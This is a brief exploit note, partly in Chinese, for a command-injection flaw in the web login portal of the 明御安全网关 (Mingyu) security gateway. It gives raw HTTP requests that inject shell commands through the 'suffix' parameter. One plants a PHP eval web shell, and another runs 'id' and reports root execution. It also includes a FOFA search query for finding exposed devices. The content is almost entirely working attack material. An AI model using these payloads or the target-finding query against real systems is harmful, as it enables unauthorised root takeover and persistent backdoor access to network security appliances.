GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|echo+"
<%3fphpteval(\$_POST[\"a\"]) ;?>"+>+.xxx.php HTTP/1.1
Host: xxx
Cookie: USGSESSID=495b895ddd42b82cd89a29f241825081
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


shell：http://xxxx/webui/.xxx.php


FOFA：body="/webui/images/basic/login/" && title=="明御安全网关"
POC:
GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%7Burlenc(%60id+%3E/usr/local/webui/test.txt%60)%7D HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded

路径：http://www.example.com/test.txt
直接命令执行返回root